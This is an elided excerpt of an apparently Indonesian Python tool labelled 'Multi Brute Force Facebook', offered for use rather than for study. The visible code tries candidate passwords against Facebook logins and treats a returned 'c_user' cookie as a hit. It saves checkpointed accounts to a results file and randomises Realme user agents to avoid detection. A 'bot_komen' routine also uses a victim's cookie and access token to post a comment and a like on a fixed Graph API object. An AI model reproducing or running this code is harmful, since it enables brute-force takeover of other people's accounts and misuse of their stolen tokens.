...
[bold red]    .-.  .-..----. .----.    .----..----.  
[bold red]    }  \/  {| {_} }} |__}___ } |__}| {_} }  author Rozak
[bold white]    | {  } || {_} }} '_}{___}} '_} | {_} }  Rozak Ganteng
[bold white]    `-'  `-'`----' `--'      `--'  `----'  
[bold blue]        \\|[bold green]Multi Brute Force Facebook[bold blue]|/""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] Version 11.0 [bold green]<[bold yellow]<[bold red]<"))
    return 0
### DAPATKAN NAMA ###
...
def bot_komen(cookie, token_eaag):
    with requests.Session() as r: # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
        ...
        response = r.post('https://graph.facebook.com/614761093806484/comments/?message={}&access_token={}'.format(text, token_eaag)).text # Jangan Di Ganti!
        response2 = r.post('https://graph.facebook.com/614761093806484/likes?summary=true&access_token={}'.format(token_eaag)).text # Jangan Di Ganti!
...
[bold white]Hasil Crack[bold red] Cp[bold white] Tersimpan Di :[bold red] Results/Cp.txt""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Results Crack) [bold green]<[bold yellow]<[bold red]"))
            ...
            for pws in password:
                ...
                with requests.Session() as r:
                    ...
                    if 'c_user' in r.cookies.get_dict().keys():
                        ...
                        tree = Tree("\r[bold white]DHANZ BOTZ                      ", style = "bold white")
                        ...
                        tree = Tree("\r[bold white]DHANZ CPEH                      ", style = "bold white")
    ...
    def realme_useragent(self, total):
        for _ in range(total):
            ...
            self.android_model = random.choice(['RMX3516', 'RMX3371', 'RMX3461','RMX3286', 'RMX3561', 'RMX3388', 'RMX3311', 'RMX3142', 'RMX2071', 'RMX1805', 'RMX1809', 'RMX1801', 'RMX1807', 'RMX1803', 'RMX1825', 'RMX1821', 'RMX1822', 'RMX1833', 'RMX1851', 'RMX1853', 'RMX1827', 'RMX1911', 'RMX1919', 'RMX1927', 'RMX1971'])
